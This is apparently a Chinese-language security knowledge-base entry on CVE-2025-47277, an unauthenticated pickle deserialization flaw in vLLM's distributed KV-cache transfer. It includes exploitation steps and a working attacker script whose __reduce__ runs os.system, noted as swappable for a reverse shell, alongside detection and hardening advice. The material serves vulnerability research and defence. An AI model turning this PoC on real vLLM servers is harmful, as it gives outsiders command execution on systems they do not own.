---
id: web-python-deserialization-vllm-pynccl-pipe-network-pickle-rce
title: vLLM PyNcclPipe KV 传输网络 pickle 反序列化：未校验 recv_obj 直接 loads 导致 RCE（CVE-2025-47277）
type: scenario
domain: web
path: web/python/deserialization
technique: vllm-pynccl-pipe-network-pickle-deserialization
tags:
- vllm
- pickle
- deserialization
- rce
- pynccl
- kv-cache
- distributed
- tcpstore
- cve-2025-47277
cve:
- CVE-2025-47277
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: 0.6.5 ≤ vLLM < 0.8.5
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T11:53:47+08:00'
  notes: 已对照原文与 4 张图核对：recv_tensor→_get_device_send_recv_impl→group.recv_obj→pickle.loads(self.store.get(...)) 链路、CPU KV buffer 分支、CVE-2025-47277、0.6.5≤vLLM<0.8.5、0.8.5 修复、whoami 执行与 'int' object is not subscriptable 接收线程异常均一致；versions 按原文设置。PoC 未独立复跑。
url: /docs/web/python/deserialization/web-python-deserialization-vllm-pynccl-pipe-network-pickle-rce/
draft: false
kb_aliases:
- CVE-2025-47277
- vLLM pickle RCE
- PyNcclPipe 反序列化
- recv_obj pickle.loads
- KV 缓存传输 RCE
- vLLM 分布式 KV RCE
---

## 一句话结论

vLLM `0.6.5 ≤ 版本 < 0.8.5` 在 VLLMEngineV0 的分布式 KV 缓存传输中，`PyNcclPipe.recv_tensor()` 经 `StatelessProcessGroup.recv_obj()` 对从 TCPStore 取回的网络数据直接 `pickle.loads()`，无身份与内容校验；能连到 KV 端口的攻击者可用 `__reduce__` 构造恶意对象，在 vLLM 服务进程执行任意命令（CVE-2025-47277，Critical）。

## 原理

- **入口链路**：`PyNcclPipe.recv_tensor()` → `_get_device_send_recv_impl()`；在非 CUDA（CPU KV buffer）路径下，`recv` 被赋为 `my_recv`，内部调用 `group.recv_obj(src)`。
- **不安全反序列化**：`StatelessProcessGroup.recv_obj()` 从 `self.store.get(f"send_to/{self.rank}/{self.recv_src_counter[src]}")` 取出字节串后直接 `pickle.loads(...)`。pickle 允许对象通过 `__reduce__` 指定还原时调用的可调用对象与参数，因此攻击者构造 `(os.system, ("cmd",))` 即可在反序列化阶段执行命令。
- **网络暴露**：底层 PyTorch `TCPStore` 默认监听 `0.0.0.0`，vLLM 的 `--kv-ip` 配置未强制绑定私有地址；在未加防火墙的多节点部署中，KV 端口可从外部或相邻租户网络访问。
- **信任假设过强**：vLLM 设计默认内网节点可信，未对加入通信组的节点做认证/授权；攻击者用 `StatelessProcessGroup.create(host, port, rank=1, world_size=2)` 即可把自己伪装成一个合法 rank，向 rank 0 发送恶意对象。
- **触发条件组合**：使用 VLLMEngineV0（V1 不受影响）、启用 PyNcclPipe KV 传输（`kv_transfer_config` / `--kv-ip`、`--kv-port`）、部署为多节点且 KV 端口暴露。单机未启用 KV 传输、使用 V1 引擎或新版 NCCL 后端时不在影响范围。
- **修复**：0.8.5 强制 TCPStore 绑定到指定私有地址（不再监听所有接口），并改进通信逻辑，避免未经校验的 `pickle.loads` 被直接调用；官方建议改用 JSON/protobuf 等安全格式，禁止 pickle 跨网络通信。

## 触发条件

- vLLM 版本在 `0.6.5 ≤ vLLM < 0.8.5`。
- 使用 VLLMEngineV0，并启用 PyNcclPipe KV 缓存传输（多节点分布式 KV 场景）。
- KV 服务端口对攻击者网络可达（公网暴露或内网横向可达），且未做 IP 白名单/防火墙限制。
- 攻击者能与 TCPStore/KV 端口建立通信并作为 rank 加入（无需合法凭据）。
- 服务端使用 CPU KV buffer 时走 `group.recv_obj` 分支；CUDA 路径使用 PyNcclCommunicator，受影响面不同。

## 利用步骤

1. 扫描/确认目标 vLLM 的 KV 传输端口（`--kv-port`，示例 18888/8888）对外开放，且版本在受影响区间。
2. 构造恶意对象：定义 `__reduce__` 返回 `(os.system, (cmd,))`，`cmd` 可为 `whoami`、反弹 shell 或下载执行命令。
3. 用 `StatelessProcessGroup.create(host=<目标>, port=<KV端口>, rank=1, world_size=2)` 建立攻击节点连接。
4. 调用 `client.send_obj(obj=Evil(), dst=0)` 把序列化对象发给 rank 0。
5. 服务端 `recv_obj()` 取回数据并 `pickle.loads`，触发 `__reduce__`，命令以 vLLM 进程用户身份执行。
6. 通过回连或命令输出确认执行结果。

## PoC

服务端触发点（本地复现环境，仅用于授权测试）：

```python
from vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe import PyNcclPipe
from vllm.config import KVTransferConfig

config = KVTransferConfig(
    kv_ip="127.0.0.1", kv_port=8888, kv_rank=0,
    kv_parallel_size=1, kv_buffer_size=1024, kv_buffer_device="cpu",
)
p = PyNcclPipe(config=config, local_rank=0)
p.recv_tensor()
```

攻击端：

```python
from vllm.distributed.utils import StatelessProcessGroup

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("whoami",))  # 可替换为反弹 shell 命令

client = StatelessProcessGroup.create(
    host="127.0.0.1", port=18888, rank=1, world_size=2,
)
client.send_obj(obj=Evil(), dst=0)
```

说明：原文截图显示目标执行了 `whoami`（输出主机/用户信息），同时 KV 接收线程抛出 `'int' object is not subscriptable` 异常，说明命令在反序列化阶段已执行，后续处理异常不影响 RCE 成立。本卡片未在本机复跑。

## 变体与关联

- 变体：把 `os.system` 换成 `subprocess.Popen`、`os.execve`、反弹 shell 或下载器，获得交互式控制。
- 变体：若目标 CUDA 路径使用 PyNcclCommunicator，攻击面不同，但同类“网络数据反序列化”问题仍应检查其它 pipe/消息通道。
- 关联：[[web-python-deserialization-mindsdb-byom-model-pickle-rce]]（另一 AI 服务 pickle RCE）、[[ai-security-supply-chain-vllm-torch-load-weights-only-pickle-rce]]（vLLM 恶意模型 torch.load pickle RCE）、[[ai-security-supply-chain-vllm-nemotron-config-auto-map-rce]]（vLLM 模型加载 RCE）、[[web-python-deserialization-pickle-codetype-function-hijack]]（pickle 通用利用）。
- 边界：V1 引擎、未启用 KV 传输的单机部署、KV 端口仅对受信节点开放且强制认证、升级到 0.8.5+ 时不受影响。

## 检测与防御

- 升级 vLLM 到 `0.8.5` 或更高；确认 TCPStore 绑定到指定私有地址而不是 `0.0.0.0`。
- 切换到 VLLMEngineV1（不使用该模块）；不需要分布式 KV 传输时关闭相关配置。
- 网络隔离：KV 端口只允许受信节点 IP，使用防火墙/安全组限制；不要把 KV 端口暴露到公网或租户共享网络。
- 协议安全：跨网络通信改用 JSON/protobuf 等无代码执行能力的数据格式，禁止 `pickle.loads` 处理不可信输入；必须使用 pickle 时加签名/HMAC 与来源认证。
- 最小权限：vLLM 进程以低权限用户运行，限制出站连接与可写目录，降低命令执行后的影响。
- 检测：监控 KV/TCPStore 端口的异常连接与 0.0.0.0 监听；审计 vLLM 进程派生的 shell/子进程；捕获 `pynccl_pipe.py` 接收线程异常；检查发往 KV 端口的 pickle 特征字节（`\x80\x04` 等）。
- 响应：若怀疑被利用，隔离节点、检查 vLLM 进程与子进程、排查反弹 shell/持久化、轮换模型与基础设施凭据，并升级到修复版本。

## 备注

原文 4 张图分别为：启动/连接日志、`_get_device_send_recv_impl` 中 `recv = my_recv → group.recv_obj` 代码、`recv_obj` 中 `pickle.loads(self.store.get(...))` 代码、以及 `whoami` 输出与接收线程异常日志。原文明确影响版本 0.6.5–0.8.5、修复版本 0.8.5，未给出 CVSS 分值；卡片 severity 按原文 Critical 标注。
